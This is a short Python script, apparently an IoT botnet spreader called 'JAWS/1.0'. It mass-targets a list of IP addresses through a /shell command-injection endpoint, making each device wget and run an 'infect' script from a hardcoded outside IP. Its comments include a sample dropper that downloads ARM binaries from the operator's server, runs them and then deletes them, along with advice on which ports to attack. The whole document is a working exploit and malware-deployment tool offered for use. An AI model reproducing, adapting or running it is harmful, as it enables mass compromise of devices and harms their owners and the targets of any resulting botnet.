#!/usr/bin/python3
# This script is written in Python 3 and requires the requests module
# Once Python and pip are installed, run "pip install requests"
# Most active port is 60001, but you can also use 5500, 8080, 8081, and a few others
# You must create a file called "infect" in your /var/www/html directory and have it wget all of your arm binaries
# EXAMPLE OF INFECT FILE:
"""
#!/bin/bash
wget http://YOURIPHERE/arm4; chmod +x arm4; ./arm4 jaws; rm -rf arm4
wget http://YOURIPHERE/arm5; chmod +x arm5; ./arm5 jaws; rm -rf arm5
wget http://YOURIPHERE/arm6; chmod +x arm6; ./arm6 jaws; rm -rf arm6
wget http://YOURIPHERE/arm7; chmod +x arm7; ./arm7 jaws; rm -rf arm7
"""
# Once this is done, you can execute the script by running python3 jaws2.py list.txt port

import threading, sys, time, re, os, requests

if len(sys.argv) < 3:
    print("\033[37mUsage: python3 " + sys.argv[0] + " list.txt port\033[37m")
    sys.exit()

ips = open(sys.argv[1], "r").readlines()
port = sys.argv[2]

class Jaws(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        try:
            print("\033[37m[\033[36mJAWS/1.0\033[37m] Dropping Shell \033[36m-> \033[37m%s" % (self.ip))
            payload = "http://" + self.ip + ":" + port + "/shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F45.145.185.189%2Finfect%3Bchmod%20777%20infect%3B.%2Finfect"
            requests.get(payload, timeout=4)
            # Line added below to show when an infection is successful. If you want only successful infections to print, comment out the previous print statement.
            print("\033[37m[\033[36mJAWS/1.0\033[37m] INFECTION SUCCESSFUL \033[36m-> \033[37m%s" % (self.ip))
        except:
            pass

for ip in ips:
    try:
        kaden = Jaws(ip)
        kaden.start()
    except:
        pass
